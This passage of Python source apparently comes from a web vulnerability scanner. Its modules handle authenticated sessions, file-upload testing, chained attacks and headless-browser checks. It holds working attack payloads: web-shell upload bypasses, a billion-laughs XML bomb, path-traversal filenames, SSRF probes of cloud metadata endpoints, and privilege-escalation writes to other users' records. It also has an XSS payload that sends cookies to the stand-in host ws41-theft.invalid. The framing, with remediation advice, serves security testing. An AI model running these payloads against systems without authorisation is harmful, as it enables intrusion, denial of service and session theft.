      - OAuth2 client_credentials flow (auto-token acquisition)
      - OAuth2 authorization_code with PKCE (headless via Playwright)
      - JWT token injection + automatic refresh before expiry
      - SSO redirect detection and cookie harvesting
      - Form-based login with CSRF token extraction
      - Session persistence across all scan modules

    Usage:
        mgr = AuthSessionManager(cfg)
        await mgr.authenticate(client)
        # All subsequent client.request() calls carry valid auth headers
    """

    def __init__(self, cfg: "ScanConfig"):
        self.cfg = cfg
        self._token: str = ""
        self._token_type: str = "Bearer"
        self._expires_at: float = 0.0
        self._refresh_token: str = ""
        self._session_cookies: dict = {}
        self._auth_headers: dict = {}
        self._lock = asyncio.Lock()

    # ── auto-detect auth type ────────────────────────────────────────────
    async def authenticate(self, client: "WebScoutClient") -> bool:
        """
        Detect and execute the appropriate auth flow.
        Injects credentials into client for all subsequent requests.
        """
        # 1. Pre-supplied JWT/Bearer
        if self.cfg.jwt_token:
            self._token = self.cfg.jwt_token
            self._token_type = "Bearer"
            self._apply_to_client(client)
            log("AUTH", "[AuthSession] Using pre-supplied JWT token")
            return True

        if self.cfg.bearer:
            self._token = self.cfg.bearer
            self._token_type = "Bearer"
            self._apply_to_client(client)
            log("AUTH", "[AuthSession] Using pre-supplied Bearer token")
            return True

        # 2. OAuth2 client_credentials (if token endpoint discoverable)
        if self.cfg.username and self.cfg.password:
            if await self._try_client_credentials(client):
                return True
            # 3. Form-based login fallback
            if self.cfg.login_url and await self._form_login(client):
                return True

        # 4. No auth configured
        return False

    # ── OAuth2 client_credentials ────────────────────────────────────────
    async def _try_client_credentials(self, client: "WebScoutClient") -> bool:
        """Try OAuth2 client_credentials flow on common token endpoints."""
        parsed = urlparse(self.cfg.login_url or client.cfg.proxy or "")
        base = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else ""
        if not base:
            return False
        token_endpoints = [
            f"{base}/oauth/token", f"{base}/oauth2/token",
            f"{base}/auth/token", f"{base}/connect/token",
            f"{base}/api/token", f"{base}/v1/oauth/token",
        ]
        for ep in token_endpoints:
            try:
                r = await client.post(ep, data={
                    "grant_type": "client_credentials",
                    "client_id": self.cfg.username,
                    "client_secret": self.cfg.password,
                    "scope": "openid profile email",
                }, headers={"Content-Type": "application/x-www-form-urlencoded"})
                if r and r.get("status") == 200:
                    try:
                        data = json.loads(r["text"])
                        tok = data.get("access_token", "")
                        if tok:
                            self._token = tok
                            self._token_type = data.get("token_type", "Bearer")
                            expires_in = int(data.get("expires_in", 3600))
                            self._expires_at = time.monotonic() + expires_in - 60
                            self._refresh_token = data.get("refresh_token", "")
                            self._apply_to_client(client)
                            log("AUTH", f"[AuthSession] OAuth2 client_credentials OK — expires in {expires_in}s")
                            return True
                    except Exception:
                        pass
            except Exception:
                pass
        return False

    # ── Form-based login ─────────────────────────────────────────────────
    async def _form_login(self, client: "WebScoutClient") -> bool:
        """POST credentials to login form, extract session cookie/token."""
        if not self.cfg.login_url:
            return False
        try:
            # GET the login page to extract CSRF token
            r_get = await client.get(self.cfg.login_url)
            csrf_token = ""
            if r_get:
                # Common CSRF field patterns
                for pattern in [
                    r'<input[^>]+name=["\'](_token|csrf|csrfToken|authenticity_token|__RequestVerificationToken)["\'][^>]+value=["\']([^"\']+)["\']',
                    r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
                ]:
                    m = re.search(pattern, r_get.get("text", ""), re.I)
                    if m:
                        csrf_token = m.group(m.lastindex)
                        break

            form_data = {
                "username": self.cfg.username, "email": self.cfg.username,
                "password": self.cfg.password, "user": self.cfg.username,
            }
            if csrf_token:
                form_data.update({"_token": csrf_token, "csrf": csrf_token,
                                   "csrfToken": csrf_token, "authenticity_token": csrf_token})

            r_post = await client.post(
                self.cfg.login_url, data=form_data,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                          "Referer": self.cfg.login_url}
            )
            if r_post:
                status = r_post.get("status", 0)
                resp_headers = r_post.get("headers", {})
                # Extract session cookies from Set-Cookie
                set_cookie = resp_headers.get("Set-Cookie", resp_headers.get("set-cookie", ""))
                if set_cookie and ("session" in set_cookie.lower() or
                                   "token" in set_cookie.lower() or
                                   "auth" in set_cookie.lower()):
                    self._session_cookies = self._parse_cookies(set_cookie)
                    self._apply_to_client(client)
                    log("AUTH", f"[AuthSession] Form login OK — cookies harvested: "
                                f"{list(self._session_cookies.keys())}")
                    return True
                # Extract Bearer from response body
                try:
                    data = json.loads(r_post.get("text", "{}"))
                    tok = (data.get("token") or data.get("access_token") or
                           data.get("jwt") or data.get("id_token", ""))
                    if tok:
                        self._token = tok
                        self._token_type = "Bearer"
                        self._apply_to_client(client)
                        log("AUTH", "[AuthSession] Form login returned JWT token")
                        return True
                except Exception:
                    pass
                if status in (200, 302):
                    log("AUTH", "[AuthSession] Form login redirected — session may be active")
                    return True
        except Exception as _fl_e:
            log("DEBUG", f"[AuthSession] Form login failed: {_fl_e}")
        return False

    # ── JWT refresh ──────────────────────────────────────────────────────
    async def refresh_if_needed(self, client: "WebScoutClient"):
        """Re-acquire token if expiry is within 60 seconds."""
        if not self._token:
            return
        if self._expires_at and time.monotonic() >= self._expires_at:
            async with self._lock:
                if time.monotonic() >= self._expires_at:
                    log("AUTH", "[AuthSession] Token expiring — auto-refreshing…")
                    if self._refresh_token:
                        await self._refresh_oauth_token(client)
                    else:
                        await self._try_client_credentials(client)

    async def _refresh_oauth_token(self, client: "WebScoutClient"):
        parsed = urlparse(self.cfg.login_url or "")
        base = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else ""
        for ep in [f"{base}/oauth/token", f"{base}/oauth2/token"]:
            try:
                r = await client.post(ep, data={
                    "grant_type": "refresh_token",
                    "refresh_token": self._refresh_token,
                    "client_id": self.cfg.username,
                    "client_secret": self.cfg.password,
                })
                if r and r.get("status") == 200:
                    data = json.loads(r.get("text", "{}"))
                    tok = data.get("access_token", "")
                    if tok:
                        self._token = tok
                        expires_in = int(data.get("expires_in", 3600))
                        self._expires_at = time.monotonic() + expires_in - 60
                        self._refresh_token = data.get("refresh_token", self._refresh_token)
                        self._apply_to_client(client)
                        log("AUTH", f"[AuthSession] Token refreshed — expires in {expires_in}s")
                        return
            except Exception:
                pass

    # ── Auto-refresh background loop (Enhancement 5) ─────────────────────
    def start_auto_refresh(self, client: "WebScoutClient",
                           interval: int = 30) -> "asyncio.Task":
        """
        Start a background asyncio Task that calls refresh_if_needed() every
        `interval` seconds for the entire duration of the scan.

        Also installs an HTTP-401 hook on the client so that any 401 response
        immediately triggers an emergency token refresh before the scanner
        retries the request.

        Returns the Task object so the caller can cancel it on scan completion.
        """
        self._auto_refresh_client = client
        self._refresh_interval    = max(10, int(interval))
        self._auto_refresh_task   = None
        self._refresh_count       = 0

        async def _loop():
            while True:
                try:
                    await asyncio.sleep(self._refresh_interval)
                    await self.refresh_if_needed(client)
                    self._refresh_count += 1
                    if self._refresh_count % 10 == 0:
                        log("AUTH",
                            f"[AutoRefresh] Heartbeat #{self._refresh_count} "
                            f"— token expires_at={self._expires_at:.0f}")
                except asyncio.CancelledError:
                    break
                except Exception as _re:
                    log("DEBUG", f"[AutoRefresh] Loop error (non-fatal): {_re}")

        self._auto_refresh_task = asyncio.ensure_future(_loop())

        # Install 401 hook on the client (duck-typed — only if attribute exists)
        _mgr_ref = self
        _orig_hook = getattr(client, "_on_401_hook", None)

        async def _on_401_emergency(resp_url: str):
            log("AUTH",
                f"[AutoRefresh] HTTP 401 on {resp_url} — emergency token refresh")
            async with _mgr_ref._lock:
                if _mgr_ref._refresh_token:
                    await _mgr_ref._refresh_oauth_token(client)
                elif _mgr_ref.cfg.username and _mgr_ref.cfg.password:
                    await _mgr_ref._try_client_credentials(client)
                elif _mgr_ref.cfg.login_url:
                    await _mgr_ref._form_login(client)
            if _orig_hook:
                await _orig_hook(resp_url)

        client._on_401_hook = _on_401_emergency
        log("AUTH",
            f"[AutoRefresh] Background refresh loop started (interval={self._refresh_interval}s)")
        return self._auto_refresh_task

    def stop_auto_refresh(self):
        """Cancel the background refresh task and remove the 401 hook."""
        if getattr(self, "_auto_refresh_task", None):
            self._auto_refresh_task.cancel()
            self._auto_refresh_task = None
        if getattr(self, "_auto_refresh_client", None):
            self._auto_refresh_client._on_401_hook = None
        log("AUTH", "[AutoRefresh] Background refresh loop stopped")

    # ── SSO detection ────────────────────────────────────────────────────
    async def detect_sso(self, client: "WebScoutClient", base_url: str) -> list:
        """
        Detect SSO providers (SAML, Azure AD, Okta, PingFederate, Google).
        Returns list of detected SSO endpoints for further testing.
        """
        findings = []
        sso_indicators = [
            ("/saml/metadata", "SAML"),
            ("/.well-known/openid-configuration", "OIDC/OAuth2"),
            ("/adfs/ls", "Microsoft ADFS"),
            ("/oauth2/v2.0/authorize", "Azure AD"),
            ("/sso/saml", "Generic SAML SSO"),
            ("/auth/realms", "Keycloak"),
            ("/api/v1/sessions", "Okta"),
            ("/ping/rest/oauth2", "PingFederate"),
            ("/simplesaml/module.php", "SimpleSAMLphp"),
        ]
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path, provider in sso_indicators:
            r = await client.get(base + path, allow_redirects=False)
            if r and r.get("status") in (200, 302, 400, 401):
                log("AUTH", f"[AuthSession] SSO detected: {provider} at {base + path}")
                findings.append({
                    "provider": provider,
                    "endpoint": base + path,
                    "status": r.get("status"),
                })
        return findings

    # ── helpers ──────────────────────────────────────────────────────────
    def _apply_to_client(self, client: "WebScoutClient"):
        """Inject current auth state into the client's default headers."""
        if self._token:
            client.cfg.bearer = self._token
        if self._session_cookies:
            existing = client.cfg.cookies or ""
            new_cookies = "; ".join(f"{k}={v}" for k, v in self._session_cookies.items())
            client.cfg.cookies = f"{existing}; {new_cookies}".strip("; ")

    @staticmethod
    def _parse_cookies(set_cookie_header: str) -> dict:
        cookies = {}
        for part in set_cookie_header.split(","):
            kv = part.strip().split(";")[0].strip()
            if "=" in kv:
                k, v = kv.split("=", 1)
                k = k.strip()
                if k.lower() not in ("path", "domain", "expires", "max-age",
                                     "secure", "httponly", "samesite"):
                    cookies[k] = v.strip()
        return cookies


class AuthenticatedMacroRecorder:
    """
    Replays a JSON login macro with Playwright and refreshes cookies every N seconds.
    Macro format:
      [{"action":"goto","url":"https://app/login"},
       {"action":"fill","selector":"#user","value":"alice"},
       {"action":"fill","selector":"#pass","value":"secret"},
       {"action":"click","selector":"button[type=submit]"},
       {"action":"wait","ms":3000}]
    """

    def __init__(self, macro_file: str, refresh_seconds: int = 600):
        self.macro_file = macro_file
        self.refresh_seconds = max(60, int(refresh_seconds or 600))
        self._task = None

    def _load_steps(self) -> list:
        data = json.loads(Path(self.macro_file).read_text(encoding="utf-8"))
        return data.get("steps", data) if isinstance(data, dict) else data

    async def run_once(self) -> str:
        try:
            from playwright.async_api import async_playwright
        except Exception as e:
            log("WARN", f"Playwright unavailable; auth macro skipped: {e}")
            return ""
        steps = self._load_steps()
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()
            try:
                for step in steps:
                    action = str(step.get("action", "")).lower()
                    if action == "goto":
                        await page.goto(step["url"], wait_until=step.get("wait_until", "networkidle"))
                    elif action == "fill":
                        await page.fill(step["selector"], str(step.get("value", "")))
                    elif action == "click":
                        await page.click(step["selector"])
                    elif action == "press":
                        await page.press(step["selector"], step.get("key", "Enter"))
                    elif action == "wait":
                        await page.wait_for_timeout(int(step.get("ms", 1000)))
                    elif action == "wait_for_selector":
                        await page.wait_for_selector(step["selector"], timeout=int(step.get("timeout", 10000)))
                cookies = await context.cookies()
                return "; ".join(f"{c['name']}={c['value']}" for c in cookies)
            finally:
                await browser.close()

    async def apply_to_config(self, cfg: "ScanConfig") -> bool:
        cookie_str = await self.run_once()
        if not cookie_str:
            return False
        existing = cfg.cookies.strip()
        cfg.cookies = f"{existing}; {cookie_str}" if existing else cookie_str
        log("AUTH", f"Auth macro refreshed {len(cookie_str.split(';'))} cookie(s)")
        return True

    def start_refresh(self, cfg: "ScanConfig"):
        async def _loop():
            while True:
                try:
                    await asyncio.sleep(self.refresh_seconds)
                    await self.apply_to_config(cfg)
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    log("WARN", f"Auth macro refresh failed: {e}")
        self._task = asyncio.create_task(_loop())
        return self._task

    async def stop(self):
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass

class FileUploadScanner:
    """
    Tests file upload endpoints for:
    - Dangerous extension bypass (PHP, JSP, ASPX disguised as images)
    - Content-Type mismatch acceptance
    - Double extension (file.php.jpg)
    - Null byte injection (file.php%00.jpg)
    - ZIP bomb / XML bomb (DoS via upload)
    - Path traversal in filename
    - Oversized file acceptance
    """

    DANGEROUS_EXTENSIONS = [
        ("php", "application/octet-stream",  "PHP web shell via direct extension"),
        ("php5", "image/jpeg",               "PHP5 bypass"),
        ("phtml", "image/jpeg",              "PHTML bypass"),
        ("phar", "image/jpeg",               "Phar archive bypass"),
        ("jsp", "image/jpeg",                "JSP web shell"),
        ("jspx", "image/jpeg",               "JSPX bypass"),
        ("aspx", "image/jpeg",               "ASPX web shell"),
        ("asp", "image/jpeg",                "ASP classic shell"),
        ("php.jpg", "image/jpeg",            "Double extension bypass"),
        ("php%00.jpg", "image/jpeg",         "Null byte injection"),
        ("php;.jpg", "image/jpeg",           "Semicolon bypass"),
    ]

    XML_BOMB = (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 '
        '"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
    )

    WEBSHELL_MARKER = "ws41_rce_probe_" + secrets.token_hex(8)

    async def _find_upload_endpoints(self, client: "WebScoutClient", url: str) -> list:
        """Find file upload forms and API endpoints."""
        endpoints = []
        r = await client.get(url)
        if not r:
            return endpoints
        forms = re.findall(
            r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>(.*?)</form>',
            r["text"], re.DOTALL | re.I
        )
        parsed = urlparse(url)
        for form in forms:
            action = re.search(r'action=["\']([^"\']+)["\']', form, re.I)
            target = urljoin(url, action.group(1)) if action else url
            input_name = re.search(r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                                   form, re.I)
            field = input_name.group(1) if input_name else "file"
            endpoints.append({"url": target, "field": field})

        common_upload_paths = [
            "/upload", "/api/upload", "/upload/file", "/api/files",
            "/media/upload", "/user/avatar", "/profile/photo",
            "/attachments", "/documents/upload", "/api/v1/upload",
        ]
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in common_upload_paths:
            r2 = await client.request("OPTIONS", base + path)
            if r2 and r2["status"] not in (404, 410):
                endpoints.append({"url": base + path, "field": "file"})
        return endpoints

    async def scan(self, client: "WebScoutClient", url: str) -> list:
        findings = []
        log("UPLOAD", "Scanning for file upload vulnerabilities…")
        endpoints = await self._find_upload_endpoints(client, url)
        if not endpoints:
            log("SKIP", "No file upload endpoints found")
            return findings

        for ep in endpoints[:5]:
            ep_url = ep["url"]
            field = ep["field"]
            log("UPLOAD", f"Testing: {ep_url} | field={field}")

            baseline = await client.get(ep_url)

            for ext, ctype, desc in self.DANGEROUS_EXTENSIONS:
                fname = f"webscout_test.{ext}"
                content = f"<?php echo '{self.WEBSHELL_MARKER}'; ?>" if ext.startswith("php") else b"\xff\xd8\xff\xe0" + self.WEBSHELL_MARKER.encode()
                if isinstance(content, str):
                    content = content.encode()
                boundary = "----WebScoutBoundary" + secrets.token_hex(8)
                body = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="{field}"; filename="{fname}"\r\n'
                    f"Content-Type: {ctype}\r\n\r\n"
                ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
                r = await client.request(
                    "POST", ep_url, data=body,
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
                )
                if not r:
                    continue
                if r["status"] in (200, 201):
                    uploaded_url = ""
                    url_match = re.search(
                        r'["\']([^"\']*(?:' + re.escape(ext.split(".")[0]) + r')[^"\']*)["\']',
                        r["text"], re.I
                    )
                    if url_match:
                        uploaded_url = urljoin(ep_url, url_match.group(1))

                    rce_confirmed = False
                    if uploaded_url:
                        r2 = await client.get(uploaded_url)
                        if r2 and self.WEBSHELL_MARKER in r2["text"]:
                            rce_confirmed = True

                    findings.append(Finding(
                        plugin="file_upload",
                        title=f"Dangerous File Upload Accepted — {desc}",
                        severity="CRITICAL" if rce_confirmed else "HIGH",
                        confidence=97.0 if rce_confirmed else 80.0,
                        description=(
                            f"Upload endpoint accepted file with extension '{ext}' ({desc}). "
                            + ("RCE confirmed — webshell marker executed." if rce_confirmed else
                               "Server returned 200/201 — manual verification advised.")
                        ),
                        evidence=(
                            f"Upload URL: {ep_url} | Field: {field} | Extension: {ext} | "
                            f"Uploaded at: {uploaded_url or 'unknown'} | "
                            f"RCE: {'YES' if rce_confirmed else 'UNCONFIRMED'}"
                        ),
                        url=ep_url, param=field, payload=fname,
                        remediation=(
                            "Validate file extension against allowlist. Verify MIME type server-side. "
                            "Store uploaded files outside web root. Use random filenames. "
                            "Execute uploaded files as static assets only."
                        ),
                        cwe="CWE-434", cvss=9.8 if rce_confirmed else 8.8, owasp="A04",
                        tags=["file-upload", "rce" if rce_confirmed else "bypass"],
                    ))
                    log("VULN", f"File upload: {desc} accepted at {ep_url}")
                    break

            r_zip = await client.request(
                "POST", ep_url,
                data=self.XML_BOMB.encode(),
                headers={"Content-Type": "application/xml", "Content-Disposition": f'attachment; filename="bomb.xml"'},
            )
            if r_zip:
                elapsed = r_zip.get("time_ms", 0)
                if elapsed and elapsed > 5000:
                    findings.append(Finding(
                        plugin="file_upload",
                        title="XML Bomb (DoS) Accepted — Upload Endpoint",
                        severity="MEDIUM", confidence=80.0,
                        description=f"XML bomb caused {elapsed}ms delay — server may be vulnerable to DoS via malicious XML.",
                        evidence=f"Response time: {elapsed}ms | URL: {ep_url}",
                        url=ep_url,
                        remediation="Validate file content. Limit XML entity expansion. Set upload size limits.",
                        cwe="CWE-400", cvss=5.9, owasp="A04",
                        tags=["file-upload", "dos", "xml-bomb"],
                    ))

            r_path = await client.request(
                "POST", ep_url,
                data=(
                    f"------Boundary\r\n"
                    f'Content-Disposition: form-data; name="{field}"; filename="../../../tmp/ws41_pt.txt"\r\n'
                    f"Content-Type: text/plain\r\n\r\nws41_path_traversal\r\n"
                    f"------Boundary--\r\n"
                ).encode(),
                headers={"Content-Type": "multipart/form-data; boundary=----Boundary"},
            )
            if r_path and r_path["status"] in (200, 201) and "ws41_path_traversal" in r_path.get("text", ""):
                findings.append(Finding(
                    plugin="file_upload",
                    title="Path Traversal in Upload Filename",
                    severity="CRITICAL", confidence=88.0,
                    description="Server accepted filename with path traversal sequences — arbitrary write possible.",
                    evidence=f"Filename: ../../../tmp/ws41_pt.txt | HTTP {r_path['status']}",
                    url=ep_url, param=field,
                    remediation="Strip path separators from filenames. Use os.path.basename(). Reject suspicious filenames.",
                    cwe="CWE-22", cvss=9.1, owasp="A01",
                    tags=["file-upload", "path-traversal"],
                ))

        log("OK", f"File upload scan done — {len(findings)} issue(s)")
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE v41-3 — Chained Attack Engine
# ════════════════════════════════════════════════════════════════════════

class ChainedAttackEngine:
    """
    Chains multiple vulnerability classes together to find compound vulnerabilities
    that are invisible when testing each class independently:
    - Open Redirect → SSRF (token theft via redirect chain)
    - Mass Assignment → IDOR (privilege escalation)
    - XSS → Cookie Theft (session hijacking chain)
    - CSRF → Account Takeover (when SameSite is Lax)
    - Subdomain Takeover → XSS (cross-origin attack chain)
    """

    async def chain_open_redirect_ssrf(self, client: "WebScoutClient", url: str) -> list:
        """Test if open redirect can be abused as SSRF pivot."""
        findings = []
        parsed = urlparse(url)
        REDIRECT_PARAMS = ["redirect", "url", "return", "next", "goto", "callback"]
        INTERNAL_TARGETS = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80",
            "http://[::1]",
            "http://metadata.google.internal/",
        ]
        for param in REDIRECT_PARAMS:
            for internal in INTERNAL_TARGETS:
                np = dict(parse_qs(parsed.query))
                np[param] = [internal]
                test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
                r = await client.get(test_url, allow_redirects=True)
                if not r:
                    continue
                body = r["text"].lower()
                ssrf_markers = [
                    "ami-id", "instance-type", "availability-zone",
                    "iam", "computeMetadata", "project-id", "gce",
                    "instance_id", "mac", "security-credentials",
                ]
                if any(m in body for m in ssrf_markers):
                    findings.append(Finding(
                        plugin="chained_attacks",
                        title=f"Chain: Open Redirect → SSRF via '{param}'",
                        severity="CRITICAL", confidence=93.0,
                        description=(
                            f"Open redirect parameter '{param}' followed to internal target '{internal}' — "
                            "server leaked cloud metadata or internal service response. "
                            "This chain enables token theft and privilege escalation."
                        ),
                        evidence=f"Internal URL reached: {internal} | Marker found in response",
                        url=test_url, param=param, payload=internal,
                        remediation="Validate redirect targets. Block redirects to private/RFC-1918 IPs.",
                        cwe="CWE-918", cvss=9.8, owasp="A10",
                        tags=["chain", "ssrf", "open-redirect", "cloud-metadata"],
                    ))
                    log("VULN", f"Chain: Open Redirect→SSRF confirmed via {param}")
        return findings

    async def chain_mass_assign_idor(self, client: "WebScoutClient", url: str) -> list:
        """Test if mass assignment combined with IDOR leads to privilege escalation."""
        findings = []
        priv_fields = ["is_admin", "admin", "role", "privilege", "account_type", "verified"]
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        user_id = None
        for p in params:
            if "id" in p.lower() and params[p][0].isdigit():
                user_id = int(params[p][0])
                break

        if user_id is None:
            return findings

        for field in priv_fields:
            for val in ["true", "1", "admin", "superuser"]:
                test_payload = {field: val, "id": user_id + 1}
                r = await client.post(url, json_body=test_payload,
                                      headers={"Content-Type": "application/json"})
                if not r or r["status"] not in (200, 201):
                    continue
                body = r["text"].lower()
                if any(ind in body for ind in ["success", "updated", "ok", "true", field]):
                    findings.append(Finding(
                        plugin="chained_attacks",
                        title=f"Chain: Mass Assignment + IDOR — Privilege Field '{field}' on ID {user_id+1}",
                        severity="CRITICAL", confidence=82.0,
                        description=(
                            f"Combined mass assignment of '{field}={val}' on another user's object (id={user_id+1}) "
                            "succeeded — potential privilege escalation on foreign object."
                        ),
                        evidence=f"Field: {field}={val} | Target ID: {user_id+1} | HTTP {r['status']}",
                        url=url, payload=json.dumps(test_payload),
                        remediation="Deny-list privilege fields in all update operations. Enforce object ownership checks.",
                        cwe="CWE-639", cvss=9.1, owasp="A01",
                        tags=["chain", "mass-assignment", "idor", "privilege-escalation"],
                    ))
                    log("VULN", f"Chain: Mass Assignment+IDOR confirmed on {field}")
        return findings

    async def chain_xss_cookie_theft(self, client: "WebScoutClient", url: str) -> list:
        """Detect XSS payloads that would succeed in stealing HttpOnly-less cookies."""
        findings = []
        r = await client.get(url)
        if not r:
            return findings

        cookies_hdr = r["headers"].get("Set-Cookie", "")
        if not cookies_hdr or "HttpOnly" in cookies_hdr:
            return findings

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        theft_payload = f'<script>document.location="http://ws41-theft.invalid/?c="+document.cookie</script>'

        for param in list(params.keys())[:5]:
            np = {**params, param: [theft_payload]}
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            r2 = await client.get(test_url)
            if not r2:
                continue
            body = r2["text"]
            if theft_payload in body or "document.cookie" in body:
                encoded = theft_payload.replace("<", "&lt;") in body
                if not encoded:
                    findings.append(Finding(
                        plugin="chained_attacks",
                        title=f"Chain: XSS + Cookie Theft — Session Hijacking via '{param}'",
                        severity="CRITICAL", confidence=90.0,
                        description=(
                            f"XSS payload with cookie exfiltration reflected unencoded in '{param}'. "
                            f"Cookie missing HttpOnly flag — session token stealable via this chain."
                        ),
                        evidence=f"Payload reflected | Cookie missing HttpOnly | Param: {param}",
                        url=test_url, param=param, payload=theft_payload,
                        remediation="Set HttpOnly on all session cookies. Encode all output. Implement CSP.",
                        cwe="CWE-79", cvss=9.3, owasp="A03",
                        tags=["chain", "xss", "cookie-theft", "session-hijacking"],
                    ))
                    log("VULN", f"Chain: XSS+Cookie theft chain confirmed via {param}")
        return findings

    async def scan(self, client: "WebScoutClient", url: str) -> list:
        log("MULTI", "Running chained attack engine…")
        results = []
        results += await self.chain_open_redirect_ssrf(client, url)
        results += await self.chain_mass_assign_idor(client, url)
        results += await self.chain_xss_cookie_theft(client, url)
        log("OK", f"Chained attack scan done — {len(results)} compound issue(s)")
        return results


# ════════════════════════════════════════════════════════════════════════
#  MODULE v41-4 — Headless Browser Integration (Playwright)
# ════════════════════════════════════════════════════════════════════════

class HeadlessBrowserScanner:
    """
    Optional Playwright/Selenium integration for:
    - True XSS confirmation (alert() execution)
    - Prototype Pollution detection via JS evaluation
    - SPA route extraction
    - Hidden API endpoint discovery from network traffic
    Falls back gracefully if Playwright is not installed.
    """

    HAS_PLAYWRIGHT = False
    _playwright_warned: bool = False  # class-level flag: show install hint only once

    def __init__(self):
        try:
            import playwright  # noqa: F401
            self.HAS_PLAYWRIGHT = True
        except ImportError:
            self.HAS_PLAYWRIGHT = False

    async def _launch_browser(self):
        if not self.HAS_PLAYWRIGHT:
            return None, None
        try:
            from playwright.async_api import async_playwright
            pw = await async_playwright().__aenter__()
            browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
            return pw, browser
        except Exception as e:
            _err_msg = str(e)
            if "executable" in _err_msg.lower() or "not found" in _err_msg.lower() or "chromium" in _err_msg.lower():
                log("WARN", (
                    f"Playwright browser not installed: {e}. "
                    "Run: python -m playwright install chromium   "
                    "(or: playwright install chromium)"
                ))
            else:
                log("WARN", f"Playwright launch failed: {e}")
            return None, None

    async def confirm_xss(self, url: str, param: str, payload: str) -> bool:
        """Return True if XSS payload triggers an alert() dialog."""
        if not self.HAS_PLAYWRIGHT:
            return False
        pw, browser = await self._launch_browser()
        if not browser:
            return False
        confirmed = False
        try:
            page = await browser.new_page()
            page.on("dialog", lambda d: d.dismiss())
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            np = {**params, param: [payload]}
            test_url = urlunparse(parsed._replace(query=urlencode(np, doseq=True)))
            triggered = []
            page.on("dialog", lambda d: triggered.append(d.type) or d.dismiss())
            await page.goto(test_url, timeout=10000)
            await page.wait_for_timeout(2000)
            confirmed = bool(triggered)
        except Exception as _pw_xss_e:
            log("DEBUG", f"[Playwright] XSS confirmation probe failed: {_pw_xss_e}")
        finally:
            await browser.close()
            if pw:
                await pw.__aexit__(None, None, None)
        return confirmed

    async def extract_api_calls(self, url: str) -> list:
        """Extract API calls made by SPA via network interception."""
        if not self.HAS_PLAYWRIGHT:
            return []
        pw, browser = await self._launch_browser()
        if not browser:
            return []
        api_calls = []
        try:
            page = await browser.new_page()
            page.on("request", lambda req: api_calls.append({
                "method": req.method, "url": req.url,
                "headers": dict(req.headers)
            }) if "/api/" in req.url or req.resource_type == "xhr" else None)
            await page.goto(url, timeout=15000)
            await page.wait_for_timeout(3000)
            nav_links = await page.evaluate("""
                () => [...document.querySelectorAll('a[href]')]
                    .map(a => a.href)
                    .filter(h => h.startsWith(window.location.origin))
                    .slice(0, 20)
            """)
            for link in nav_links[:10]:
                try:
                    await page.goto(link, timeout=8000)
                    await page.wait_for_timeout(1000)
                except Exception as _pw_nav_e:
                    log("DEBUG", f"[Playwright] Navigation to {link} skipped: {_pw_nav_e}")
        except Exception as e:
            log("WARN", f"Headless API extraction error: {e}")
        finally:
            await browser.close()
            if pw:
                await pw.__aexit__(None, None, None)
        return api_calls

    async def detect_prototype_pollution(self, url: str) -> Optional[dict]:
        """Check if prototype pollution affects the page via JS eval."""
        if not self.HAS_PLAYWRIGHT:
            return None
        pw, browser = await self._launch_browser()
        if not browser:
            return None
        result = None
        try:
            page = await browser.new_page()
            await page.goto(url, timeout=15000)
            await page.evaluate("""() => { Object.prototype.ws41_polluted = 'YES'; }""")
            polluted = await page.evaluate("""() => ({}).ws41_polluted""")
            if polluted == "YES":
                result = {"polluted": True, "url": url}
        except Exception as _pw_poll_e:
            log("DEBUG", f"[Playwright] Prototype pollution probe failed: {_pw_poll_e}")
        finally:
            await browser.close()
            if pw:
                await pw.__aexit__(None, None, None)
        return result

    # ── SPA framework detection (static, no browser needed) ─────────────
    SPA_SIGNATURES = {
        "React":      [r"react(?:\.min)?\.js", r"__REACT_", r"data-reactroot",
                       r"_reactFiber", r"ReactDOM\.render", r"react-dom"],
        "Next.js":    [r"_next/static", r"__NEXT_DATA__", r"next/dist", r"__next"],
        "Angular":    [r"ng-version=", r"angular(?:\.min)?\.js", r"__ng_", r"ng-app"],
        "Vue":        [r"vue(?:\.min)?\.js", r"__VUE__", r"v-bind:", r"v-model=",
                       r"nuxt(?:\.min)?\.js", r"__NUXT__"],
        "Svelte":     [r"svelte", r"__svelte"],
        "Ember":      [r"ember(?:\.min)?\.js", r"Ember\.Application"],
        "Backbone":   [r"backbone(?:\.min)?\.js"],
    }

    @classmethod
    def detect_spa_framework(cls, html: str, response_headers: dict = None) -> list:
        """
        Detect SPA frameworks from HTML body and response headers.
        Returns list of detected framework names.
        """
        detected = []
        text = html[:50000]  # scan first 50k chars only
        for framework, patterns in cls.SPA_SIGNATURES.items():
            for pat in patterns:
                if re.search(pat, text, re.I):
                    detected.append(framework)
                    break
        # Check X-Powered-By header
        if response_headers:
            powered = response_headers.get("X-Powered-By", "")
            if "Next.js" in powered and "Next.js" not in detected:
                detected.append("Next.js")
        return list(set(detected))

    # ── deep SPA crawl (requires Playwright) ────────────────────────────
    async def deep_crawl_spa(self, url: str, max_routes: int = 30,
                              auth_token: str = "") -> dict:
        """
